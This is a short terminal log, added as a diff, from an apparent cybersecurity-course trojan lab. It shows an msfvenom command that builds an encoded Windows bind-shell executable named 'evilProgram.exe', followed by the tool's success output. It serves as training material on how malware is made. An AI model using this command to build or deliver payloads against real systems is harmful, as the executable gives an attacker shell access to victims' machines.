@@ -1,0 +1,11 @@
+┌──(kali㉿kali)-[~/cybersecurity_academy/LAB_08/Trojan/TROJAN_WINDOW]
+└─$ sudo msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai LPORT=4444 -f exe -o evilProgram.exe
+[sudo] password for kali: 
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 353 (iteration=0)
+x86/shikata_ga_nai chosen with final size 353
+Payload size: 353 bytes
+Final size of exe file: 73802 bytes
+Saved as: evilProgram.exe
+                             
